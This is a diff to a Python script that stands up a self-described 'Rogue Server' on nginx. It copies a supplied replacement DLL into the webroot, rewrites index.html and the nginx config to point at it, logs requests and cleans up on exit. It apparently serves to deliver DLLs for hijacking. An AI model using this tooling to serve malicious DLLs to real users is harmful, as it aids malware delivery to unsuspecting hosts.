@@ -5,29 +5,28 @@ import shutil
 import signal
 import sys
 import argparse
+from termcolor import colored, cprint
 
 def start_nginx_service_safely():
     # Check if the script is being run as a superuser (root)
     if os.geteuid() != 0:
-        print("You need to run this script with superuser privileges (e.g., using 'sudo').")
+        cprint("[*] You need to run this script with superuser privileges (e.g., using 'sudo').","yellow")
         return
 
     # Check if the 'service' command exists
     if not shutil.which('service'):
-        print("The 'service' command is not available on your system. Make sure you have it installed.")
+        cprint("[-] The 'service' command is not available on your system. Make sure you have it installed.","red")
         return
 
     try:
-        # Command to start the Nginx service
-        command = "service nginx start"
-
-        # Run the command using subprocess
-        subprocess.run(command, shell=True, check=True)
-        print("[+] Nginx service started successfully.")
+        # Run the command using subprocess & create Acess log file
+        subprocess.run(["touch","/tmp/access.log"], check=True)
+        subprocess.run(["service", "nginx", "start"], check=True)
+        cprint("[+] Nginx service started successfully.","green")
     except subprocess.CalledProcessError as e:
-        print(f"Error starting Nginx service: {e}")
+        cprint(f"[-] Error starting Nginx service: {e}", "red")
     except Exception as e:
-        print(f"An error occurred: {e}")
+        cprint(f"An error occurred: {e}","red")
 
 
 def modify_Serverfile(file_path,replacement_dll):
@@ -42,37 +41,51 @@ def modify_Serverfile(file_path,replacement_dll):
         with open(file_path, 'w') as file:
             file.write(new_content)
     except FileNotFoundError:
-        print(f"File not found: {file_path}")
+        cprint(f"[-] DLL File not found: {file_path}","red")
     except Exception as e:
-        print(f"An error occurred: {str(e)}")
+        cprint(f"[-] An error occurred: {str(e)}","red")
 
 
 
 def deployment(dll_path):
     # updating webroot directory
     dll_file_name=os.path.basename(dll_path)
-    clean_up(dll_file_name)
+    #clean_up(dll_file_name)
     shutil.copy(dll_path,"/var/www/html")
-    modify_Serverfile("./WebServer/index.html",dll_file_name)
+    modify_Serverfile("./webserver/index.html",dll_file_name)
     os.rename("/var/www/html/index.html","/var/www/html/index.html.bak")
-    shutil.copy("./WebServer/index.html","/var/www/html/index.html")
+    shutil.copy("./webserver/index.html","/var/www/html/index.html")
     #changing the nginx config
-    modify_Serverfile("./WebServer/nginx.conf",dll_file_name)
+    modify_Serverfile("./webserver/nginx.conf",dll_file_name)
     os.rename("/etc/nginx/sites-available/default","/etc/nginx/sites-available/default.bak")
-    shutil.copy("./WebServer/nginx.conf","/etc/nginx/sites-available/default")
+    shutil.copy("./webserver/nginx.conf","/etc/nginx/sites-available/default")
     start_nginx_service_safely()
-
+    cprint("[+] Rogue Server started at port 81","green")
+    try:
+        while True:
+            cprint("[+] Serving the logs....","green")
+            cprint("[*] Press CTRL+C to stop the server")
+            subprocess.run(["tail","-n","1","-f","/tmp/access.log"],check=True)
+    except KeyboardInterrupt:
+            cprint("[+] CTRL+c Detected, Stopping nginx service ....","yellow")
+            subprocess.run(["service", "nginx", "stop"], check=True)
+            cprint("[+] Nginx Stopped Sucessfully","green")
+            clean_up(dll_file_name)
+    except EOFError:
+            cprint("[-] Error in Starting Nginx\n-check your installation\n-stop nginx manually","red")
+            clean_up(dll_file_name) 
 
 def clean_up(dll_file_name):
     try:
         os.remove(f"/var/www/html/{dll_file_name}")
+        os.remove(f"/tmp/access.log")
         if os.path.exists("/etc/nginx/sites-available/default.bak"):
             #clean up of nginx config files
-            print("[+] Clean up in process...",end="")
+            cprint("[+] Cleaning up the artifacts...","green",end="")
             os.remove("/etc/nginx/sites-available/default")
             os.rename("/etc/nginx/sites-available/default.bak","/etc/nginx/sites-available/default")
         if os.path.exists("/var/www/html/index.html.bak"):
-            print("...")
+            cprint("...","green")
             #clean up of webroot directory
             os.remove("/var/www/html/index.html")
             os.rename("/var/www/html/index.html.bak","/var/www/html/index.html")
